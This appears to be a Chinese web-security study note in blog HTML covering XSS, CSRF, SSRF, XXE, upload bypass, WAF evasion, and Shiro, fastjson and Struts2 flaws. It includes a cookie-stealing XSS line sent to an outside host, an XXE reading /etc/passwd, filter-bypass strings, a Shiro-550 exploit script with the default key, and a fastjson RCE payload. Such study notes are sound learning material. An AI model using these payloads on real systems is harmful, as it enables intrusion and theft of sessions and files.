+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以在myscripts.js中插入恶意代码，例如：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;恶意代码已执行！&#x27;</span>);</span><br></code></pre></td></tr></table></figure>
+
+<p>当用户访问包含上述代码的网页时，恶意代码将被执行，弹出一个警告框</p>
+<p>如果攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>XSS攻击可以分为以下几种类型：</p>
+<ol>
+<li>存储型XSS攻击，又称持久型XSS：攻击者将恶意脚本代码存储在Web应用程序的数据库中，当用户访问包含该恶意代码的页面时，恶意代码会被执行。</li>
+<li>反射型XSS攻击，又称非持久型XSS：攻击者将恶意脚本代码作为参数发送给Web应用程序，Web应用程序将该参数反射回给用户，从而执行恶意代码。</li>
+<li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li>
+</ol>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol>
+<li>HTML编码绕过：攻击者通过对恶意脚本代码进行HTML编码，从而绕过应用程序的过滤和验证。</li>
+<li>JavaScript编码绕过：攻击者通过对恶意脚本代码进行JavaScript编码，从而绕过应用程序的过滤和验证。</li>
+<li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li>
+</ol>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol>
+<li>Unicode编码：攻击者通过对恶意脚本代码进行Unicode编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>\u003Cscript\u003Ealert(&#39;XSS&#39;)\u003C/script\u003E</code>。</li>
+<li>Base64编码：攻击者通过对恶意脚本代码进行Base64编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==</code>。</li>
+<li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li>
+<li>双重编码：攻击者通过对恶意脚本代码进行双重HTML编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E</code>。</li>
+<li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li>
+</ol>
+<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ul>
+<li>使用HTTPOnly Cookie。HTTPOnly Cookie只能通过HTTP协议传输，无法通过JavaScript等脚本语言访问，从而防止恶意脚本代码访问Cookie。这样，即使恶意脚本代码能够注入到网页中，也无法窃取用户的会话信息</li>
+</ul>
+<h1 id="CSFR"><a href="#CSFR" class="headerlink" title="CSFR"></a>CSFR</h1><p>跨站脚本攻击</p>
+<p>原理</p>
+<ul>
+<li>同站请求<ul>
+<li>一个来自example.com的网页向example.com发送请求</li>
+</ul>
+</li>
+<li>跨站请求<ul>
+<li>evil.com向example.com发送请求</li>
+</ul>
+</li>
+</ul>
+<p>假设受害者访问了evil.com，该网页中嵌入了js代码，进行了跨站请求，浏览器在请求发起时附加所有属于example.com的cookies，那么就会造成跨站脚本攻击</p>
+<p>一个get请求示例</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>src</code>属性指定一个URL <code>http://www.csrflabelgg.com/action/friends/add?friend=59</code>，它似乎是带有<code>friend</code>参数的HTTP GET请求的URL。如果用户访问了这个页面并且已经登陆到csrflabelgg.com网站，则该 GET 请求会向该网站发送<code>friend=59</code>参数的请求</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>验证token<ul>
+<li>在每个HTTP请求里附加一部分token信息</li>
+</ul>
+</li>
+<li>Referer标识了请求是从哪里发起的<ul>
+<li>可以通过判断有问题的请求是否是同域下发起的来防御CSRF攻击</li>
+</ul>
+</li>
+<li>可以在header中增加csrf_token</li>
+</ul>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF（Server-side Request Forge）。SSRF是从服务器发出的，那么攻击者可以通过构造恶意的url来访问原本访问不到的内网信息，攻击内网或者本地其他服务</p>
+<h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><ul>
+<li>使用 URL 编码（百分号编码）绕过一些常见的限制<ul>
+<li>有些服务器应用程序可能试图限制应用程序向特定的路径发送请求，使用 <code>%2f</code> 替代 <code>/</code> 符号来绕过路径限制，使用 <code>%25</code> 替代 <code>%</code> 符号来绕过百分号编码限制</li>
+<li>使用 <code>%25</code> 替代 <code>%</code> 符号来绕过百分号编码限制</li>
+</ul>
+</li>
+<li>dict协议： dict://serverip:port/命令:参数</li>
+<li>gopher协议：攻击者可以构造恶意的 Gopher URL （使用“gopher://”协议前缀）来发送恶意请求</li>
+<li>File 协议: File 协议是一种用于访问本地文件系统的协议。file:///c:/windows/system32/drivers/etc/hosts</li>
+<li>ip绕过<ul>
+<li>通过各种非HTTP协议（以上</li>
+<li>0.0.0.0这个IP可以饶过正则直接访问到本地</li>
+<li>将 IP 地址转换为十六进制格式，并使用十六进制 IP 地址进行 SSRF 攻击。例如，将 192.168.1.1 转换为 C0A80101</li>
+<li>将 IP 地址转换为逗号分隔的格式。例如，将 192.168.1.1 转换为“192,168,1,1”</li>
+<li>采用进制转换，127.0.0.1 八进制：**<code>0177.0.0.1</code><strong>；十六进制：</strong><code>0x7f.0.0.1</code><strong>；十进制：</strong><code>2130706433</code>**</li>
+<li>利用**<code>[::]</code>，<code>http://[::]:80/</code>** 会解析为 <strong><code>http://127.0.0.1</code></strong></li>
+</ul>
+</li>
+</ul>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></li>
+</ul>
+<h1 id="XXE（XML-外部实体注入-XML-External-Entity-Injection）"><a href="#XXE（XML-外部实体注入-XML-External-Entity-Injection）" class="headerlink" title="XXE（XML 外部实体注入 XML External Entity Injection）"></a>XXE（XML 外部实体注入 XML External Entity Injection）</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>XML 外部实体注入（XML External Entity Injection，简称 XXE）是一种攻击技术，攻击者利用 XML 解析器的漏洞，向应用程序注入恶意的外部实体，从而导致应用程序受到攻击。以下是三个与 XXE 攻击相关的示例：</p>
+<ol>
+<li>在 XML 文档中引用<strong>外部实体</strong>：攻击者可以在 XML 文档中引用一个外部实体，例如一个文件或 URL，然后利用该实体中的内容来执行攻击。例如，攻击者可以在 XML 文档中引用一个包含恶意代码的文件，然后通过解析该文件来执行攻击。</li>
+<li>在 XML 文档中使用<strong>参数实体</strong>：攻击者可以在 XML 文档中使用参数实体，例如 %file;，然后将其定义为一个外部实体，例如 <code>&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>，从而读取敏感文件或执行任意代码。</li>
+<li>在 XML 文档中使用<strong>远程实体</strong>：攻击者可以在 XML 文档中使用远程实体，例如 <code>&lt;!ENTITY file SYSTEM &quot;http://attacker.com/malicious.dtd&quot;&gt;</code>，然后将其定义为一个包含恶意代码的 DTD 文件，从而执行攻击。</li>
+</ol>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ul>
+<li>禁用外部实体的引入</li>
+<li>过滤如SYSTEM等敏感关键字</li>
+</ul>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>文件上传漏洞是一种常见的 Web 应用程序安全漏洞，攻击者可以利用该漏洞上传恶意文件，例如 Web shell、木马程序等，从而获取对目标系统的控制权。其原理如下：</p>
+<ol>
+<li>Web 应用程序通常允许用户<strong>上传文件</strong>，例如图片、文档等。</li>
+<li>攻击者可以通过<strong>构造恶意的上传请求</strong>，例如<strong>修改上传文件的 MIME 类型</strong>、使用特殊的文件名等，来绕过应用程序的上传过滤机制。</li>
+<li>攻击者上传的恶意文件可能包含恶意代码，例如 Web shell、木马程序等，从而使攻击者能够远程控制目标系统。</li>
+</ol>
+<h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h2><ul>
+<li>禁用JS实现绕过</li>
+<li>%00，0x00截断<ul>
+<li>比如修改文件名为 <strong>1.php%00.jpg</strong>，如果php 版本&lt;5.3.4  在url中%00表示ascll码的0 ，而ascii码的0，表示字符串结束，所以当url中出现%00时就会认为读取已结束，最后会被解析为 1.php，从而实现绕过</li>
+</ul>
+</li>
+<li>抓包修改MIME类型<ul>
+<li>服务端代码是通过Content-Type的值来判断文件的类型，这样我们可以直接对文件的Content-Type值进行修改来绕过</li>
+</ul>
+</li>
+</ul>
+<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><ul>
+<li>文件上传的目录设置为不可执行</li>
+<li>采用WAF等安全防护设备</li>
+<li>文件类型采用白名单而不是黑名单，并且综合MIME和后缀判断</li>
+</ul>
+<h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><h2 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h2><ul>
+<li>/usr/s?in/?at /et?/pass?d<ul>
+<li>问号(?)表示通配符，可以替换任意的单个字符（非空），*表示通配符，可以匹配任意长度（包括空）</li>
+</ul>
+</li>
+<li>select/**/from<ul>
+<li>内联注释</li>
+</ul>
+</li>
+<li>字符编码，比如base64</li>
+</ul>
+<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><ol>
+<li>Proxy（代理）：使用 Burp Suite Proxy 工具，用户可以<strong>实时拦截和查看浏览器和 Web 服务器之间的请求和响应</strong>。用户可以修改<strong>请求和响应数据</strong>，或者添加自定义数据包到请求或响应中以进行攻击测试。可以使用 <strong>Proxy 代理请求，自定义请求包，检查服务器返回的响应包，进行中间人攻击模拟等等</strong></li>
+<li>Intruder（爆破）：Intruder 是 Burp Suite 内置的一种攻击工具，可以对 Web 应用程序进行高效且精细的自动化攻击，例如暴力破解密码、拒绝服务攻击 (DoS) 等，对应用程序的输入参数集合进行批量测试和攻击，快速发现潜在的安全漏洞。它支持多种不同的攻击方式（如爆破、字典攻击、精确匹配等），支持变量位置标注、多线程并发操作等高级功能。</li>
+<li>Repeater（重发器）：允许测试人员简化测试配置的过程，复制、构建和修改请求信息并发送回服务器，测试不同的测试数据、编写不同的 payload 检查服务器返回的响应，用于重新测试、重新调整和重新验证应用程序的每个模块</li>
+<li>Decoder（解码器）：当我们在一个应用程序中，我们常常会对用户提交的数据进行编码，例如对特殊字符进行 URL 编码、对 HTML / JavaScript 代码进行转义等，因此在测试过程中，我们通常需要先对这些编码过的数据进行解码，然后再进行有效的攻击和漏洞测试。Burp Suite 中的 Decoder 工具可以自动通过多种编码方法（如 Base64、Unicode、URL 编码等）解码请求，以帮助测试人员快速分析和修改潜在的安全漏洞。</li>
+</ol>
+<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><ol>
+<li>-level：用于指定 SQL 注入攻击检测的级别，包括 1（默认）、2、3、4 和 5 级别，级别越高，攻击测试越深入和全面，但同时也会产生更多的虚警或误报。</li>
+<li>-r：用于指定 SQL 注入攻击的目标，例如一个 HTTP 请求报文，从而进行有效的注入测试。可以通过抓包工具捕获 HTTP 请求报文，将其保存至文件并使用 -r 参数指定进行注入测试。</li>
+<li>-u：用于指定一个或多个待测试的目标 URL，这些 URL 通常包含一个或多个 GET 或 POST 参数，可以使用 SQLMap 对这些参数进行 SQL 注入测试。</li>
+<li>–method：用于设置 SQL 注入测试所使用的 HTTP 访问方法，包括 GET、POST、HEAD、PUT、DELETE 等。</li>
+<li>-cookie：用于指定所需的自定义 Cookie，为了通过身份验证过程，可能需要使用有效的 Cookie 值。</li>
+<li>-tamper：用于指定使用什么样的混淆器算法来混淆请求内容，从而更难被检测到。SQLMap 内置了许多常见的混淆器技巧和算法，如括号包含、大小写混淆、注释、字符串串联等。</li>
+</ol>
+<h1 id="中间件及常见漏洞"><a href="#中间件及常见漏洞" class="headerlink" title="中间件及常见漏洞"></a>中间件及常见漏洞</h1><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>IIS （Internet Information Services）</p>
+<p>常见的 IIS 解析漏洞包括以下几种：</p>
+<ol>
+<li>目录遍历漏洞：攻击者可以通过构造特定的 URL 查询字符串使 IIS 解析时出现目录遍历，获取到系统敏感文件。</li>
+<li>文件包含漏洞：攻击者可以通过构造恶意链接构造后缀名为 ASP/ASPX/JSP/PHP 的 URL 来注入系统命令，进而导致任意 IP 地址的任意代码执行。</li>
+<li>代码执行漏洞：攻击者利用 IIS 的某些属性或方法执行代码，从而突破应用程序的安全机制。</li>
+</ol>
+<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><ul>
+<li>目录遍历<ul>
+<li>对于 Nginx Web 服务器来说，当 autoindex 参数被设置为 on 时，开启了自动目录索引功能，就容易受到目录遍历漏洞攻击。攻击者可以通过在 URL 中添加 “..” 或 “%2e%2e%2f” 等字符，来访问服务器的任意目录和文件，读取敏感数据或执行远程代码等操作</li>
+</ul>
+</li>
+<li>目录穿越<ul>
+<li>location /foo { alias /bar/; }，如果存在 /foo../ 的请求，会被解析成 /bar/../，经过转化后，即相当于跳出了 /bar/ 目录，从而导致了目录穿越的发生。</li>
+</ul>
+</li>
+</ul>
+<h1 id="Apache-Shiro"><a href="#Apache-Shiro" class="headerlink" title="Apache Shiro"></a>Apache Shiro</h1><blockquote>
+<p>shiro 550 721区别</p>
+<p>漏洞成因是因为有一个remeberme的方法，它可以对cookie进行加密后存储，下次访问就不需要登录了，生成方法是对cookie先进行序列化，aes加密，base64加密</p>
+<p>550就是aes它是使用固定的key进行加密，所以就可以直接构造cookie利用</p>
+<p>721的话是使用aes128cbc加密，可以不固定，可以使用padding oracle attack的工具进行利用，好像还需要提供一个有效的cookie，以及需要明确对方的操作系统</p>
+</blockquote>
+<p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理</p>
+<blockquote>
+<p>反序列化操作的本质是将输入的字节流转换成程序中的对象实例，而在Java中，对象实例的创建与对象的构造函数相关联，因此攻击者在构造恶意序列化数据时可以搭载特定的构造函数，进而在反序列化时触发自定义的代码</p>
+</blockquote>
+<h2 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie</p>
+<p>生成过程：rememberMe的值-》序列化-》AES加密-》base64编码-》得到cookie值</p>
+<p>服务器：base64解码-》然后AES解密-》再反序列化，就导致了反序列化RCE漏洞</p>
+<p><strong>如果使用了默认的硬编码的AES秘钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>，那么就可以构造恶意payload，通过在cookie的rememberMe字段中插入恶意payload，触发shiro框架的rememberMe的反序列化功能，导致任意代码执行</strong></p>
+<h3 id="如何发现使用Shiro的系统"><a href="#如何发现使用Shiro的系统" class="headerlink" title="如何发现使用Shiro的系统"></a>如何发现使用Shiro的系统</h3><ul>
+<li>在登录页面时，提交表单后看set-cookie是否存在remeberMe=deleteMe(认证失败时会设置deleteMe的cookie:)</li>
+<li>在流量中搜索remeberMe=deleteMe</li>
+<li>fofa的搜索关键词：header=”rememberme=deleteMe”、header=”shiroCookie”</li>
+</ul>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
+<li>获取反向shell</li>
+<li>远程代码执行</li>
+</ul>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br></code></pre></td></tr></table></figure>
+
+<h2 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h2><blockquote>
+<p><strong>这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code><strong>进而反序列化，对比Shiro550条件只要有</strong><code>足够密钥库</code><strong>（条件比较低）、Shiro721需要登录（要求比较高</strong><del><strong>鸡肋</strong></del>）。</p>
+</blockquote>
+<p>Shiro使用了<strong>AES-128-CBC加密</strong>（Cipher Block Chaining , 密码分组链接模式）</p>
+<p>明文按照固定大小进行分组，最后一个数据块会进行填充，使其满足块的长度要求。假设最后一个数据块分组不为16byte时，就会进行填充，每个被填充的字节的值就是被填充的字节数量 。比如说，<strong>如果缺少四个字节，那么这四个字节都会被填充为0x04</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305011823616.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面是CBC的流程，初始化向量（IV）会被用在加密和解密的过程中</p>
+<ul>
+<li><p>加密：第一段明文和IV异或，之后进行加密，将结果与下一段明文进行异或，这样的话，可以使得即使是相同的明文，也可以被加密成不同的内容</p>
+</li>
+<li><p>解密：第一段密文进行解密，解密结果与IV进行异或，这样才能得到明文</p>
+</li>
+</ul>
+<p>若最后1个解密出的明文padding填充值错误，会导致解密不成功，报错。因此可以通过爆破进行攻击</p>
+<ul>
+<li>检测密文最后一组的填充值是否正确来确定能否正常解密</li>
+<li>通过服务端解密后的响应状态来判断填充的字节是否正确来进行穷举攻击<ul>
+<li>用户的密文与填充数据正确 ==&gt; 200</li>
+<li>用户的密文与填充数据都错误 ==&gt; 500</li>
+<li>用户的密文正确，填充数据错误 ==&gt; 301</li>
+</ul>
+</li>
+</ul>
+<p>CBC字节翻转攻击的原理 : 通过损坏密文字节来改变明文字节</p>
+<p>写不下去了，参考一下这个：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://blog.h4ck.fun/shiro_721_analysis/">https://blog.h4ck.fun/shiro_721_analysis/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217#leftbar_tab_catalog">https://goodapple.top/archives/217#leftbar_tab_catalog</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/999">https://www.sec-in.com/article/999</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45605352/article/details/116846678">https://blog.csdn.net/weixin_45605352/article/details/116846678</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/121314926">https://blog.csdn.net/qq_41874930/article/details/121314926</a></p>
+</li>
+</ul>
+<h1 id="fastjson漏洞"><a href="#fastjson漏洞" class="headerlink" title="fastjson漏洞"></a>fastjson漏洞</h1><p>Fastjson是一个Java语言编写的高性能JSON处理库，支持将Java对象转换为JSON串，以及将JSON串转换为Java对象</p>
+<h2 id="fastjson-1-2-24反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>@type是fastjson中用于指定Java类类型信息的一种注解标签。在fastjson的反序列化过程中，如果发现JSON串中存在@type标签，fastjson会根据该标签来进行自动类型转换。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.example.User&quot;</span>,<br>    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-attr">&quot;age&quot;</span>: <span class="hljs-number">25</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>fastjson在解析该JSON串时，会根据@type的值（”com.example.User”），将该JSON串转换成一个对应的Java对象（com.example.User类型），并将JSON串中的字段值设置到Java对象相应的属性中。</p>
+<p>攻击者可以通过构造特定的JSON数据，JSON字符串中包含了**@type注解，并在其中指向了一个恶意类，那么fastjson在反序列化时会自动实例化这个恶意类，并尝试调用其中的setter方法设置恶意的参数值**</p>
+<p>setter方法（也称作设置方法）是一种用于设置某个对象属性值的特殊方法。setter方法通常采用 public void setXXX(XXX value)的命名方式，在其中使用一个参数value来设置对象中的属性值。</p>
+<p>例如，一个类可能包含一个叫做name的属性，那么它的setter方法通常定义如下：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.name = name;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个setter方法通过使用参数name设置类中的name属性。通过设置setter方法，可以控制属性的访问权限，避免直接对成员变量进行操作，从而增强了程序的安全性和封装性。</p>
+<p>攻击者可以通过构造含有特定setter方法的payload，利用fastjson库自动调用这个方法并传入恶意参数来实现攻击。此类攻击通常被称为fastjson反序列化远程代码执行（RCE）漏洞</p>
+<p>常见的exploit payload是：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中<code>@type</code>指定要实例化的类型，<code>dataSourceName</code>指定了RMI（远程方法调用）的服务地址和服务名。这个payload会将JdbcRowSetImpl实例化并连接到指定的RMI服务，从而实现RCE（远程代码执行）攻击</p>
+<h1 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h1><h2 id="Struts2-016命令执行漏洞"><a href="#Struts2-016命令执行漏洞" class="headerlink" title="Struts2-016命令执行漏洞"></a>Struts2-016命令执行漏洞</h2><blockquote>
+<p>struts2漏洞有一个明显的特征就是url路径里有*.action或*.do</p>
+</blockquote>
+<p>在Struts2中，DefaultActionMapper类是一个用于处理URL到Action的映射的默认实现。它支持使用”action:”、”redirect:”和”redirectAction:”作为导航或重定向前缀。这些前缀后面可以跟随Action名称或OGNL表达式。</p>
+<p><strong>由于Struts2没有对这些前缀进行过滤，攻击者可以在URL中注入恶意的OGNL表达式，从而执行任意的Java静态方法，包括执行系统命令</strong>。这种漏洞被称为”远程命令执行”（RCE）漏洞，是一种非常危险的安全漏洞。</p>
